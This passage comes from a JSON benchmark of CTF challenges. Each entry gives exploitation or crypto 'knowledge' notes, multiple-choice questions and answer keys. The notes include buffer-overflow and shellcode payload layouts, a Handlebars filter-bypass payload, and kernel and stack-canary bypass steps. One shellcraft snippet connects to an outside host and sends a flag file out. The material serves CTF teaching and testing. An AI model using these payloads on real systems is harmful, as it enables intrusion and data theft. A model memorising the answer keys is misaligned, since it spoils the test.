            "In a given binary with a buffer overflow vulnerability, why would an attacker choose to pivot the stack into the BSS segment?  - A.To directly execute system calls without using libc functions. - B.To utilize the program's read-only data section for injecting code. - C.To modify the program's execution flow by utilizing a writable section when limited ROP gadgets are available. - D.To increase the size of the stack and thus prevent overflow vulnerabilities. ",
            "When the Global Offset Table (GOT) is read-only and the task is to execute a function from libc that is not directly actionable due to limited gadgets, what strategy would be most effective in achieving arbitrary code execution?  - A.Overwriting return addresses on the stack to point directly to the desired libc function. - B.Using the existing GOT entries to indirectly call other functions within the binary. - C.Utilizing writable pointers to stream buffers in the BSS section to manipulate control flow indirectly. - D.Creating a new GOT section in the writable data segment to bypass read-only restrictions. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "babybof1 pt1",
        "write_up": "dataset/raw/babybof1 pt1.md",
        "type": "pwn",
        "competition": [
            "castorsCTF/2020",
            "https://ctftime.org/event/1063/tasks/"
        ],
        "score": 86,
        "max_score": 496,
        "difficulty": 0.17338709677419356,
        "knowledge": [
            "When exploiting a buffer overflow vulnerability, identify the exact number of characters required to reach the return address in the program's memory. This calculation is critical to precisely overwrite the return address with the desired function's address. For example, in a situation where a buffer allocated 256 chars and observed through debugging (using gdb or similar tools) that the return address is overwritten after an additional 8 chars, the exact payload size before the desired function address should be 264 chars. Example payload part: \"A\"*264.",
            "To execute a function within a binary that is not directly called during normal execution (e.g., a hidden `get_flag()` function), the payload should include the function's address appended after the overflow characters. This address must be in little-endian format if the binary is executed on an x86_64 architecture with little endian byte order. Before crafting the payload, use a disassembler or debugger to find the memory address of the target function. Example payload part for an Intel x86_64 architecture system: \"\\xe7\\x06\\x40\\x00\\x00\\x00\\x00\\x00\", where `\\xe7\\x06\\x40\\x00\\x00\\x00\\x00\\x00` is the little-endian representation of the function's memory address."
        ],
        "question": [
            "In a buffer overflow vulnerability where the buffer can hold 256 characters, how many extra characters are required to reach and overwrite the return address based on the given scenario? - A. 264 characters - B. 256 characters - C. 260 characters - D. 258 characters",
            "Given a hidden function `get_flag()` located at memory address `0x4006e7` in a binary exploiting a buffer overflow vulnerability, how should the address be formatted in the payload for an exploit targeting an x86_64 architecture system? - A. \"0x4006e7\" - B. \"0xe7064000\" - C. \"\\xe7\\x06\\x40\\x00\\x00\\x00\\x00\\x00\" - D. \"\\x00\\x00\\x00\\x00\\x00\\x40\\x06\\xe7\""
        ],
        "answer": [
            "A",
            "C"
        ]
    },
    {
        "name": "BabyJS",
        "write_up": "dataset/raw/BabyJS.md",
        "type": "crypto",
        "competition": [
            "Defenit/2020",
            "https://ctftime.org/event/1060/tasks/"
        ],
        "score": 248,
        "max_score": 906,
        "difficulty": 0.2737306843267108,
        "knowledge": [
            "When a web application employs a server-side template engine (like Handlebars in this scenario) and filters or conditions are part of the logic, clever use of the template engine's own functions or statements can allow for bypassing restrictions. To bypass a filter that blocks certain keywords (like \"FLAG\") and limitations on the content size:\n    - Employ template engine features to dynamically generate or manipulate the blocked term within the template rendering process itself. In the provided case, the use of `replace`, combined with scope movement using `#with` and `lookup` functions, facilitated the crafting of the keyword \"FLAG\" dynamically, avoiding direct filter triggers.\n    - Example payload: \n    ```\n    {{#with this as |k|}}\n      {{#with \"FLag\"}}\n        {{#with (replace \"ag\" \"AG\") as |payload|}}\n          {{lookup k payload}}\n        {{/with}}\n      {{/with}}\n    {{/with}}\n    ```",
            "Leveraging specific expressions in template engines like Handlebars to access environmental objects or variables indirectly. The exploit utilized the template's capability to interpret object properties (`this`) and execute functions (`replace`) or statements (`#with`, `lookup`) to indirectly access sensitive information or bypass restrictions based on content length or keyword banning. This can often be generalized in scenarios where user input might be rendered on the server side, enabling access to server-side variables:\n    - Use template syntax to manipulate or access variables indirectly when direct access is blocked or monitored. The approach can be particularly effective in environments where the template engine\u2019s context (`this`) includes sensitive data, or where the engine supports reflective operations on its context.\n    - Example payload cannot be simplified beyond the given complex Handlebars expression but the principle involves scope manipulation (`#with`), dynamic string manipulation (`replace`), and indirect data access (`lookup`) within the template's capabilities."
        ],
        "question": [
            "In the context of a web application using the Handlebars template engine, how can restrictions on content length and specific keyword (\"FLAG\") presence be bypassed?  - A. By manually adjusting the content's length attribute and directly including the keyword in the payload. - B. Utilizing client-side JavaScript to modify the content before submission to evade server-side checks. - C. Employing Handlebars built-in functions such as `replace` within a `#with` block to dynamically generate the blocked keyword and avoid direct filter triggers. - D. Using HTML comments to hide the keyword and reduce the actual content size perceived by the server. ",
            "In a scenario where a web application renders user input through a server-side template engine like Handlebars, which approach allows accessing server-side variables or environmental objects that are not directly exposed to the user?  - A. Injecting standard JavaScript code to directly access server-side environment variables. - B. Utilizing template syntax to manipulate or access server-side variables indirectly, employing functions (`replace`), statements (`#with`), and indirect data access methods (`lookup`) within the template engine. - C. Modifying HTTP request headers to include additional variables or objects in the template rendering context. - D. Employing CSS injection to alter the DOM and expose server-side variables through visual elements. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "BabyKitDriver",
        "write_up": "dataset/raw/BabyKitDriver.md",
        "type": "pwn",
        "competition": [
            "0CTF/2023",
            "https://ctftime.org/event/2073/tasks/"
        ],
        "score": 647,
        "max_score": 664,
        "difficulty": 0.9743975903614458,
        "knowledge": [
            "In kernel exploitation, when attempting to bypass KASLR (Kernel Address Space Layout Randomization), a common technique involves leaking kernel stack contents. This can be achieved by exploiting a vulnerability that allows reading an arbitrary number of bytes from a kernel buffer, such as reading -1 bytes from a buffer with a specified size, which may lead to leaking kernel memory stack contents. This information can then be used to compute the kernel base address.",
            "Exploiting race conditions between reading and writing operations on kernel buffers can lead to arbitrary code execution. By preparing the memory layout appropriately and triggering a race condition where a write operation modifies a function pointer (e.g., v2.output) between the verification step and its usage by a concurrent read operation, an attacker can gain control over the instruction pointer (RIP) and subsequently execute arbitrary code. This technique may involve stabilizing the race condition by ensuring the payload is stored in advance to ensure the write operation completes with the intended malicious value."
        ],
        "question": [
            "In the context of kernel exploitation, particularly when bypassing KASLR by exploiting a vulnerability that leaks kernel stack contents, which of the following methods could be used to trigger a significant leak? - A. Writing 0xFF bytes to a buffer and reading it back - B. Reading -1 bytes from a v2 buffer allowing for potential stack content leak - C. Performing a buffer overflow by writing beyond the allocated buffer size - D. Using a use-after-free vulnerability to manipulate freed kernel objects ",
            "When exploiting a race condition between reading and writing operations on kernel buffers for arbitrary code execution, what critical action must be taken to gain control over RIP (Instruction Pointer)? - A. Executing multiple write operations in parallel to overflow the buffer - B. Stabilizing the race by pre-storing the payload to overwrite a function pointer (e.g., v2.output) at a specific timing - C. Triggering a use-after-free condition to redirect execution flow - D. Allocating and freeing memory repeatedly to cause heap fragmentation and manipulation "
        ],
        "answer": [
            "B",
            "B"
        ]
    },
    {
        "name": "babymips",
        "write_up": "dataset/raw/babymips.md",
        "type": "The challenge \"0CTF 2020 - baby MIPS\" is a reverse challenge.",
        "competition": [
            "0CTF/2020/Quals",
            "https://ctftime.org/event/1026/tasks/"
        ],
        "score": -1,
        "max_score": 846,
        "difficulty": -1,
        "knowledge": [
            "For challenges involving ciphered text based on XOR and addition operations, always analyze the manipulation patterns. If each character of the input is XORed with a variable (e.g., the index `i`) and then a constant is added or subtracted (e.g., `+ 0x17`), consider using symbolic execution or constraint solvers like Z3 to systematically search for possible solutions. This strategy is effective when the cipher algorithm is relatively simple and operates on a linear transformation basis.",
            "When dealing with encrypted or encoded flags where the algorithm involves iterating through each character, applying a transformation, and comparing it to a provided sequence, consider using Python scripts combined with Z3 Solver. This approach allows specifying constraints for each character based on the observed transformation logic and systematically solving for possible plaintext inputs that satisfy all the constraints, leading directly to the decryption or decoding of the flag."
        ],
        "question": [
            "In a situation where the challenge involves decoding a ciphertext where each character `c` of the plaintext is transformed using an XOR operation followed by an addition, as expressed by the equation `(c XOR i) + 0x17 = encoded_char`, where `i` represents the index of the character, and `encoded_char` is the corresponding character in the ciphertext. What is the correct approach to recover the original plaintext assuming the ciphertext and the transformation equation are known? - A. Use a brute force approach to try all possible combinations of plain text characters until the original message is recreated. - B. Utilize the Python programming language and Z3 Solver to create a script that sets up constraints based on the transformation equation for each character and systematically solves for the plaintext. - C. Manually reverse the equation for a few characters and guess the rest of the plaintext based on the pattern observed. - D. Encrypt several known plaintexts using the same method and build a dictionary to map encrypted characters to their original form for decryption. ",
            "Given the encoded flag and transformation logic where each byte of the input is XORed with its index and an added constant (e.g., `encode_function(inp, i) = (inp XOR i) + 0x17`), which of the following tools or methods is best suited to systematically decode the flag? - A. Applying classical cryptography techniques such as frequency analysis to guess the key. - B. Designing a Python script leveraging the Z3 Solver to define constraints for each byte based on its encoding logic and solve for the input bytes that satisfy these constraints. - C. Using a substitution cipher decoder by manually substituting each encrypted character based on a standard English frequency chart. - D. Conducting an exhaustive search of all possible byte values for the plaintext without considering the specific transformation logic. "
        ],
        "answer": [
            "B. Utilize the Python programming language and Z3 Solver to create a script that sets up constraints based on the transformation equation for each character and systematically solves for the plaintext.",
            "B. Designing a Python script leveraging the Z3 Solver to define constraints for each byte based on its encoding logic and solve for the input bytes that satisfy these constraints."
        ]
    },
    {
        "name": "babyre2",
        "write_up": "dataset/raw/babyre2.md",
        "type": "reverse",
        "competition": [
            "RCTF/2018",
            "https://ctftime.org/event/624/tasks/"
        ],
        "score": 444,
        "max_score": 869,
        "difficulty": 0.5109321058688148,
        "knowledge": [
            "When analyzing binary files with complex assembly instructions, such as SSE (Streaming SIMD Extensions) instructions, it may sometimes be more effective to directly read the assembly rather than relying solely on high-level decompiler outputs. Decompilers can sometimes misinterpret or obscure the logic behind certain operations, especially with complex data manipulations performed by instructions like SSE. Directly reading the assembly can offer clearer insight into the operations being performed, such as data structure manipulations, bitwise operations, or specific algorithm implementations.",
            "In situations where the challenge involves solving linear congruence equations, as seen with operations that involve multiply-modulo-compare patterns, employing mathematical algorithms like Euclid's extended algorithm can significantly reduce the complexity of solving these equations. This approach is particularly advantageous when faced with large numbers (2^64 possibilities in this case) which make brute-forcing impractical or impossible. Utilizing the right algorithm can turn an otherwise intractable problem into one that can be solved efficiently.\n\nExample payload for solving linear congruence equations: \n\n```python\n# Python code snippet using Euclid's extended algorithm to solve linear congruence equations\ndef egcd(a, b):\n    if a == 0:\n        return (b, 0, 1)\n    else:\n        g, x, y = egcd(b % a, a)\n        return (g, y - (b // a) * x, x)\n\ndef mod_inv(a, m):\n    g, x, y = egcd(a, m)\n    if g != 1:\n        raise Exception('Modular inverse does not exist')\n    else:\n        return x % m\n\n# Example usage to solve: ax \u2261 1 (mod m)\na = 0x20656d6f636c6557  # Example 'a' value from the equations\nm = 0xFFFFFFFFFFFFFFC5  # The modulus\nx = mod_inv(a, m)  # Calculate the modular inverse of 'a'\nprint(\"The modular inverse is:\", hex(x))\n```\n\nThis script provides a template for solving equations of the form \\(ax \\equiv b \\, (\\text{mod } m)\\), which are common in cryptography and binary exploitation challenges."
        ],
        "question": [
            "When analyzing a binary executable that employs Streaming SIMD Extensions (SSE) for data manipulation, why might directly reading the assembly code offer more clarity than using high-level decompiler outputs?  - A. Decompilers accurately represent all assembly operations, including SSE instructions, without any loss of information.  - B. Decompilers can sometimes misinterpret SSE instructions, leading to obscured or inaccurate representation of the logic behind certain operations.  - C. Assembly code is always simpler to understand than decompiler outputs for any kind of binary analysis task.  - D. High-level decompiler outputs provide more detailed information about data manipulations performed by SSE instructions than the assembly code itself. ",
            "In the context of solving equations that follow a multiply-modulo-compare pattern, such as finding the inputs that satisfy \\((input[i] * s[i]) \\% 0xFFFFFFFFFFFFFFC5 == result[i]\\), why is employing Euclid's extended algorithm more efficient than brute-forcing?  - A. Euclid's extended algorithm increases the number of possibilities to consider, making it easier to find the correct inputs through exhaustive search.  - B. Applying Euclid's extended algorithm will automatically provide the correct inputs without any need for computation due to its magical properties.  - C. Employing algorithms like Euclid's extended algorithm can significantly reduce the complexity by efficiently computing modular inverses, making it impractical to solvesuch equations through brute-forcing.  - D. Brute-forcing is always the preferred method in solving large number multiplication and modulo operations due to its simplicity and directness. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "babysandbox (pwn)",
        "write_up": "dataset/raw/babysandbox (pwn).md",
        "type": "pwn",
        "competition": [
            "MeePwn/2018/Quals",
            "https://ctftime.org/event/625/tasks/"
        ],
        "score": 100,
        "max_score": 940,
        "difficulty": 0.10638297872340426,
        "knowledge": [
            "In challenges where sandbox evasion is required, and the security mechanism filters certain syscalls, identifying unique characteristics of the execution environment (such as specific register values) can help in differentiating between execution in a sandboxed environment and native execution. This knowledge can be used to conditionally execute arbitrary code only in the desired environment. As demonstrated, checking the `ecx` register's value to determine if the code is running natively or within a sandboxed environment like Unicorn can guide strategic execution paths. Example payload snippet: \n   ```\n   cmp ecx, 0x100\n   jnz loose\n   ```",
            "Utilizing `pwnlib.shellcraft` for generating shellcode provides a convenient method to incorporate complex operations such as file reading or establishing network connections into exploit payloads without manually writing the assembly code. This is particularly useful in CTF challenges for extracting information from a vulnerable application or system once sandbox restrictions are bypassed or when direct execution of arbitrary code is possible. Combining sandbox evasion techniques with shellcraft's pre-built functionalities enables efficient and effective exploitation. Example payload snippet for sending file contents over a network connection:\n   ```\n   shellcraft.i386.linux.connect(\"1.2.3.4\", 55555) +\n   shellcraft.i386.linux.readfile(\"flag\", \"edx\")\n   ```"
        ],
        "question": [
            "In a cybersecurity challenge, if an attacker needs to determine whether their code is running natively on a target system or within a sandboxed environment like Unicorn, which register and value check could accurately facilitate this distinction? - A. Check if the `ebx` register is set to `0xFF`. - B. Check if the `ebp` register is set to `0x200`. - C. Check if the `ecx` register is set to `0x100`. - D. Check if the `esi` register is set to `0x300`.",
            "When developing an exploit for a CTF challenge that requires executing arbitrary shellcode to bypass sandbox restrictions and perform complex operations such as reading a file or establishing a network connection, which library is particularly useful for generating the necessary shellcode without manually writing the assembly code? - A. `pwntools.util.packing` - B. `pwnlib.shellcraft` - C. `binascii.hexlify` - D. `subprocess`"
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "babystack",
        "write_up": "dataset/raw/babystack.md",
        "type": "pwn",
        "competition": [
            "0CTF/2018/Quals",
            "https://ctftime.org/event/557/tasks/"
        ],
        "score": 132,
        "max_score": 1000,
        "difficulty": 0.132,
        "knowledge": [
            "In challenges involving a stack overflow vulnerability where direct control over the return address is not possible due to stack canaries or other protections, one can use techniques to manipulate other control data like the old base pointer (rbp) value. This manipulation can lead to Arbitrary Address Write (AAW) by carefully crafting inputs to overwrite control data and then leveraging indirect control over the instruction pointer (rip) to execute a Return-Oriented Programming (ROP) chain. This method can be particularly useful in binaries where stack canaries protect the return address but other control data can still be overwritten.\n   \n   Example approach: \n   - First input to read function: \"\\x00\"*0x10 (if applicable, based on binary's read behavior).\n   - Craft a payload that overwrites the old rbp value with a controlled value.\n   - Use a sequence of gadgets like [pop rbp; ret], a fake rbp value, and [leave; ret] to control the stack layout and execute a longer ROP chain beyond initial payload size limitations.",
            "When addressing challenges with stack overflow vulnerabilities on `x86-64` architectures with protections like NX, Canary, and ASLR enabled, but with No RELRO, it's possible to leak important addresses (like `atol@GOT` for libc base address calculation) and then overwrite the stack canary with a known good value. This technique allows for the execution of a 'one gadget' execve(\"/bin/sh\") or similar RCE (Remote Code Execution) payload by bypassing stack protection mechanisms. This method leverages the vulnerability to write beyond the buffer limit, using knowledge about the binary's behavior and memory layout (such as TLS location in case of pthread usage) to bypass modern binary exploitation mitigations.\n\n   Example approach:\n   - Leak necessary libc addresses (e.g., `atol@GOT`) for libc base address calculation.\n   - Bypass the stack canary by overwriting it with a leaked or correctly guessed value.\n   - Execute a 'one gadget' or construct a ROP chain to spawn a shell or perform other unintended operations."
        ],
        "question": [
            "In a binary exploitation challenge with a stack overflow vulnerability, which technique allows for controlling the instruction pointer (rip) indirectly through manipulation of the stack's control data when direct modification of the return address is inhibited by protections? - A. Directly overwrite the rip with a buffer overflow - B. Use a format string vulnerability to modify the rip - C. Manipulate the old base pointer (rbp) value to achieve Arbitrary Address Write (AAW) and then execute a ROP chain - D. Exploit a heap overflow to corrupt the rip ",
            "For an `x86-64` stack overflow challenge with protections such as NX, Canary, and ASLR enabled but lacking RELRO, which approach effectively bypasses stack protection to achieve arbitrary code execution? - A. Overwrite the Global Offset Table (GOT) directly with shellcode - B. Leak libc addresses and overwrite the stack canary with a valid value to execute a 'one gadget' - C. Utilize a use-after-free vulnerability to hijack control flow - D. Exploit an integer overflow to bypass ASLR "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Babysteps",
        "write_up": "dataset/raw/Babysteps.md",
        "type": "pwn",
        "competition": [
            "NahamCon/2022",
            "https://ctftime.org/event/1630/tasks/"
        ],
        "score": 385,
        "max_score": 2199,
        "difficulty": 0.17507958162801274,
        "knowledge": [
            "In scenarios where a buffer overflow vulnerability is identified in a binary exploitation challenge, specifically without stack canaries, NX disabled, and a known buffer size, use a payload that consists of an adequate number of NOPs to reach the EIP register, followed by a \"jmp eax\" gadget address if the buffer\u2019s location is stored in the EAX register. This approach redirects code execution to a shellcode placed right after the EIP. It's essential to calculate the buffer to EIP offset accurately.  \nExample payload structure: `\\x90` * offset + `jmp eax gadget address` + `shellcode`",
            "Utilize tools like ROPgadget to find the necessary gadget, such as \"jmp eax\", for constructing a working exploit when dealing with binary exploitation challenges, especially when direct execution flow manipulation is required to achieve code execution. The selection of the \"jmp eax\" gadget is contingent upon confirming that the buffer or payload to be executed is pointed to by the EAX register.\nExample command: `ROPgadget --binary binary_name | grep \"jmp eax\"`"
        ],
        "question": [
            "In a binary exploitation challenge where NX is disabled and there is no stack canary, if an attacker finds that the program accepts input without proper bounds checking, which of the following steps is NOT a correct approach to develop an exploit payload targeting the EIP register with the buffer starting in the EAX register?  - A. Use a series of NOPs exactly matching the offset from the buffer to the EIP, followed by the shellcode. - B. Place the address of a \"jmp eax\" gadget into the EIP location directly after the NOP sled to redirect execution to the shellcode located at the start of the buffer. - C. Fill the buffer completely with the shellcode without considering the offset to the EIP, ensuring the shellcode's start aligns with the beginning of the buffer. - D. Calculate the exact offset from the buffer to the EIP and fill this space with NOPs to ensure that the execution jumps accurately to the shellcode right after the EIP. ",
            "When preparing an exploit for a buffer overflow vulnerability in a program compiled for i386 architecture, which of the following commands is most appropriate for identifying a gadget that would redirect execution flow to the buffer's address contained in the EAX register?  - A. `ROPgadget --binary vulnerable_binary | grep \"jmp esp\"` - B. `ROPgadget --binary vulnerable_binary | grep \"call eax\"` - C. `ROPgadget --binary vulnerable_binary | grep \"jmp eax\"` - D. `ROPgadget --binary vulnerable_binary | grep \"push eax\"` "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Backtalk",
        "write_up": "dataset/raw/Backtalk.md",
        "type": "crypto",
        "competition": [
            "WPICTF/2019",
            "https://ctftime.org/event/728/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When analyzing Diffie-Hellman key exchange protocol information in network captures, discrete logarithm problems can be efficiently solved using computational algebra systems like SageMath, specifically when handling large modulus numbers. It is crucial to identify the generator `g`, modulus `mod`, and the public keys exchanged to compute the shared secret key. In scenarios where direct computation of discrete logarithm is infeasible due to computational limitations, dropping optional parameters (like the 'ord' parameter in SageMath's `discrete_log` function) might resolve the issue, as it can impact the efficiency of the computation.  \nExample SageMath code snippet:  \n```python\nK = GF(mod)  \ndiscrete_log(K(pub), K(g))  # where 'pub' and 'g' are known values from the key exchange\n```",
            "To decrypt messages encrypted with Diffie-Hellman key exchange based symmetric keys, once the shared secret is calculated, it can be used to decrypt the encryption key (`enc_key`) if the encryption follows a scheme similar to ElGamal encryption. This involves converting the shared secret and `enc_key` to a form usable by symmetric key algorithms like AES. In this context, decryption requires determining the symmetric key from `enc_key` and the shared secret, then using it with the appropriate symmetric decryption algorithm. This method is applicable in scenarios where the shared secret and an encrypted symmetric key are available from intercepted encrypted communications.  \nExample Python code snippet for decryption process:  \n```python\nsecret = some_shared_secret_calculation_method()  # Calculate or retrieve the shared secret\nmod = some_mod_value()  # The modulus used in the key exchange\nenc_key = some_enc_key_value()  # The encrypted symmetric key retrieved from communications\n\n# Calculate the decryption key\nkey = enc_key * pow(secret, mod - 2, mod) % mod\nkey_bytes = Crypto.Util.number.long_to_bytes(key)  # Convert key to byte format\n\n# Decrypt using AES in ECB mode\nfrom Crypto.Cipher import AES\ncipher = some_cipher_text()  # The encrypted message to decrypt\naes = AES.new(key_bytes, mode = AES.MODE_ECB)\ndecrypted_message = aes.decrypt(cipher)\n```"
        ],
        "question": [
            "In a cybersecurity scenario involving the analysis of Diffie-Hellman key exchange in network captures, which computational approach is effective for solving discrete logarithm problems with large modulus numbers, especially when certain parameters impact computational efficiency? - A. Implementing a custom algorithm to manually compute logarithms without computational algebra systems. - B. Utilizing geometric progression formulas to manually calculate discrete logarithms. - C. Using a computational algebra system like SageMath and potentially adjusting or omitting optional parameters (like the 'ord' parameter) for efficiency. - D. Solely relying on brute-force methods for all sizes of discrete logarithm problems without leveraging any algebraic optimizations or computational algebra systems.",
            "When faced with the task of decrypting a message encrypted using a symmetric key derived from a Diffie-Hellman based secret, after obtaining the shared secret and an encrypted symmetric key (`enc_key`), which step is necessary to decrypt the message correctly in the context of ElGamal encryption adaptation? - A. Directly use the shared secret as the symmetric key for decryption without any further processing. - B. Multiply the encrypted symmetric key (`enc_key`) by the shared secret's modular inverse with respect to the large prime modulus, and then apply the resulting key for symmetric decryption. - C. Sum the shared secret and the encrypted symmetric key (`enc_key`), and use this sum as the decryption key directly without modular arithmetic operations. - D. Apply a secure hash function on the shared secret to generate the decryption key without utilizing the encrypted symmetric key (`enc_key`)."
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "Backup - frank",
        "write_up": "dataset/raw/Backup - frank.md",
        "type": "crypto",
        "competition": [
            "MidnightSun/2021/Quals",
            "https://ctftime.org/event/1139/tasks/"
        ],
        "score": 121,
        "max_score": 428,
        "difficulty": 0.2827102803738318,
        "knowledge": [
            "When half of an RSA private key is erased, one can use the visible part of the key and OCR (Optical Character Recognition) tools like pytesseract in Python to recover the readable parts from images. This step is pivotal in processes where physical or digital corruption has led to partial loss of key data. Correcting OCR mistakes manually ensures the accuracy of the recovered data, which is critical for the next steps of key reconstruction.",
            "In scenarios where parts of the RSA key components (like `p`, `q`, `dp`, `dq`) are known and the goal is to recover missing components, mathematical relationships among these components can be utilized. For instance, `p = (e*dp - 1)/kp + 1` and `q = (e*dq - 1)/kq + 1`, where `e` is the public exponent and `dp`, `dq` are parts of the private key. A script can then brute force `kp` and `kq` to recover the prime numbers `p` and `q`, enabling the reconstruction of the full private key. This approach applies when enough key details are visible or recoverable to derive the necessary components.\n\nExample Python snippet for reconstructing full RSA private key:\n```python\nfrom Crypto.PublicKey import RSA\ne = 0x10001  # Public exponent\n# Assuming the 'n', 'p', 'q', 'dp', 'dq' values are derived from the above steps\nphi = (p-1) * (q-1)\nd = pow(e, -1, phi)  # Derive private exponent\nkey = RSA.construct((n, e, d, p, q))  # Construct RSA key object\npem = key.exportKey('PEM')  # Export the private key in PEM format\nprint(pem.decode())\n```"
        ],
        "question": [
            "In an RSA key recovery challenge, if an OCR (Optical Character Recognition) tool like pytesseract in Python is used to recover readable parts from an image of a partially erased private key, which of the following steps is crucial to ensure the accuracy of the recovered data? - A. Increasing the contrast of the image before using OCR - B. Correcting OCR mistakes manually for precise data recovery - C. Converting the OCR output directly to hexadecimal without checking - D. Encrypting the OCR output to enhance security before analysis",
            "Given the public exponent `e` and parts of the RSA private key (`dp`, `dq`), which formula correctly describes the recovery of the prime number `p`, crucial for reconstructing a full RSA private key? - A. `p = e / (dp - 1) + 1` - B. `p = (e * dp) / (1 - kp) + 1` - C. `p = (e * dp - 1) / kp + 1` - D. `p = kp / (e * dp - 1) + 1`"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "back_to_basics",
        "write_up": "dataset/raw/back_to_basics.md",
        "type": "crypto",
        "competition": [
            "UIUCTF/2021",
            "https://ctftime.org/event/1372/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "When dealing with custom encoding mechanisms where each character of a key represents a base in which the input is encoded, the decryption process requires iteratively decoding the data from the largest possible base down to the base that yields a plausible result, typically ASCII printable characters. The approach involves identifying the maximum character in the encoded data, determining its base from a custom alphabet, and attempting to decode from all possible bases greater than this determined base until the output falls within expected ASCII ranges.",
            "In scenarios involving encoded data that does not conform to standard encoding methods (e.g., Base64, Hex), constructing a custom decode function that works with arbitrary bases can help in decryption attempts. This function should convert the encoded data from its string representation back to binary, considering the specific alphabet used for encoding. This process is essential when the encoding scheme employs a non-standard alphabet or when data is encoded using variable bases."
        ],
        "question": [
            "Given a scenario where you have an encrypted string and a custom alphabet as follows: `bytearray(b\"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ#\")`, and you know that the encryption process involved encoding the original data iteratively using each character of a key as a base. What step is crucial for starting the decryption process? - A. Converting the encrypted string directly into ASCII characters without considering the base. - B. Identifying the largest character in the encrypted data to determine the smallest possible base for the custom alphabet. - C. Assuming the encryption base is always a standard base like 64 or 16 and directly converting from that base. - D. Encrypting the data once more with the same key to double-encrypt before attempting decryption. ",
            "In a custom encoding scheme where data is encoded with variable bases using a specific alphabet, which approach is necessary for constructing a custom decode function that allows for decryption attempts? - A. Ignoring the specific alphabet used and attempting to decode using standard encoding methods like UTF-8. - B. Using a fixed base value for decoding, assuming that all encodings use common standards such as Base64. - C. Converting the encoded data from its string representation back to binary according to the specific alphabet and the base used for encoding. - D. Treating the encoded data as a simple substitution cipher and applying frequency analysis to decrypt. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Bad Python",
        "write_up": "dataset/raw/Bad Python.md",
        "type": "reverse",
        "competition": [
            "TJCTF/2020",
            "https://ctftime.org/event/928/tasks/"
        ],
        "score": 50,
        "max_score": 100,
        "difficulty": 0.5,
        "knowledge": [
            "For encryption and decryption involving XOR operations, if the encryption algorithm involves XORing the plaintext with a sequence of values (derived from a key or password) and the operation is repeated in a deterministic manner (e.g., modulo operation based on plaintext index), then the decryption process can use the same sequence of XOR operations in reverse with the known or brute-forced key to retrieve the original plaintext. This principle leverages the property of XOR where applying the same operation twice will revert to the original value.\n   \n   Example payload for decryption (given key and encrypted output):\n   ```\n   decrypted_output = []\n   key = 'exampleKey123'\n   encrypted_output = b'\\x01\\x02\\x03...' # snippet of encrypted data\n   for i in range(len(encrypted_output)):\n       ki = ord(key[i % len(key)]) # Repeat key characters as necessary\n       decrypted_output.append(chr(encrypted_output[i] ^ ki))\n   decrypted_text = ''.join(decrypted_output)\n   ```",
            "In scenarios where an encryption scheme relies on the properties and arrangement of characters within a key (e.g., characters used in groups, sorting of characters within groups, modulo operations for selecting group members), brute-forcing can be optimized by segmenting the key into parts according to its usage within the algorithm and testing combinations of character values that align with observed patterns in the encrypted output when compared against known plaintext. This technique is particularly effective when the encryption process can be understood or replicated from reverse-engineering the algorithm.\n\n   Example approach for key retrieval segment-wise:\n   ```\n   for each segment in key:\n       for all possible values in segment:\n           if encrypted_value derived from segment matches known pattern with plaintext:\n               segment_value = possible_value\n               break as potential part of the key\n   reconstruct full key using identified segment values\n   ```"
        ],
        "question": [
            "Given an encrypted message and the key used for an XOR-based encryption algorithm, which of the following Python code snippets correctly decrypts the message back to its original plaintext?  ``` encrypted_message = b'\\xa1\\xf3\\xbc...' key = 'secretKey123' ```  - A. ```python plaintext = ''.join([chr(byte ^ ord(key[i % len(key)])) for i, byte in enumerate(encrypted_message)]) ```  - B. ```python plaintext = ''.join([chr(byte + ord(key[i % len(key)])) for i, byte in enumerate(encrypted_message)]) ```  - C. ```python plaintext = ''.join([chr(byte & ord(key[i % len(key)])) for i, byte in enumerate(encrypted_message)]) ```  - D. ```python plaintext = ''.join([byte ^ key[i % len(key)] for i, byte in enumerate(encrypted_message)]) ``` ",
            "When attempting to brute force decrypt an encrypted message where the encryption key is known to consist of characters grouped and used in a certain repeating pattern, which of the following approaches is most efficient?  - A. Attempting all possible keys in the entire keyspace until the correct key is found.  - B. Dividing the key into segments according to its pattern of use in encryption, then brute-forcing each segment separately based on its impact on a known portion of the plaintext.  - C. Brute-forcing the key character by character from start to end without considering the segmentation or pattern of use in the encryption algorithm.  - D. Using a genetic algorithm to evolve the key starting from a random population of possible keys assuming random distribution of key characters. "
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "Baffling Buffer 1",
        "write_up": "dataset/raw/Baffling Buffer 1.md",
        "type": "pwn",
        "competition": [
            "MetaCTF/2020",
            "https://ctftime.org/event/1106/tasks/"
        ],
        "score": -1,
        "max_score": 525,
        "difficulty": -1,
        "knowledge": [
            "When exploiting vulnerable functions like `gets()` that do not limit input length, buffer overflow can be achieved by sending an input longer than the buffer size. This can be combined with a tactic to bypass string processing limitations (like a null byte to signify the end of valid input) before overflowing the buffer to overwrite critical addresses such as the return address on the stack. This leads to arbitrary code execution by redirecting execution flow to a desired function within the binary. As demonstrated, to target a specific function (`win` in this instance), calculate the necessary padding to reach the return address and overwrite it with the target function's address. Example payload snippet: `\"\\x00\" + pad*\"A\" + p64(win).decode()`",
